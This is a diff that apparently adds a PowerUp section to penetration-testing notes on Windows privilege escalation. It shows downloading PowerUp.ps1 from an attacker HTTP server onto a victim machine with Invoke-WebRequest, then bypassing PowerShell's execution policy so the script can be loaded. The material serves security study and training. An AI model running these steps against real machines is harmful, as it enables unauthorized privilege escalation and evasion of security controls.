@@ -143,3 +143,45 @@ Several PowerShell scripts exist to help enumerate machines where scripting is a
   * There is also a Python version of this tool for environments where that can be used
 
 These scripts can be used in similar ways as the tools above. First the script must be moved to the target machine, then run, and the output analyzed.
+
+### PowerUp
+
+[PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) is part of a module created to automatically check for privilege escalation vectors. Details on installing the module can be found in the project's [README](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/README.md). It is also possible to import just the PowerUp module and use its commands.
+
+First use the attaacker's HTTP server (hosted at `http://ATTACKER-IP:8888`) to transfer the `PowerUp.ps1` file to the victim machine via an `Invoke-WebRequest` from the victim machine:
+
+{% code overflow="wrap" %}
+```powershell
+PS C:\Users\dave> Invoke-WebRequest -uri http://192.168.45.177:8888/Windows/PowerShell/PrivilegeEscalation/PowerUp.ps1 -OutFile PowerUp.ps1
+```
+{% endcode %}
+
+Once on the machine, the module can be imported:
+
+```powershell
+PS C:\Users\dave> . .\PowerUp.ps1
+. : File C:\Users\dave\PowerUp.ps1 cannot be loaded because running scripts is disabled on this system. For more
+information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
+At line:1 char:3
++ . .\PowerUp.ps1
++   ~~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+```
+
+Unfortunately in this example the&#x20;
+
+[Execution Policy](../../powershell/#powershell-execution-policy) is preventing script execution. PowerShell must be started with the `-ExecutionPolicy Bypass` flag set in order to circumvent the policy:
+
+```powershell
+PS C:\Users\dave> PowerShell -ExecutionPolicy Bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\dave> . .\PowerUp.ps1
+PS C:\Users\dave>
+```
+
+At this point the module has been imported successfully and any of the [commands](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/README.md#powerup) contained therein can be used.
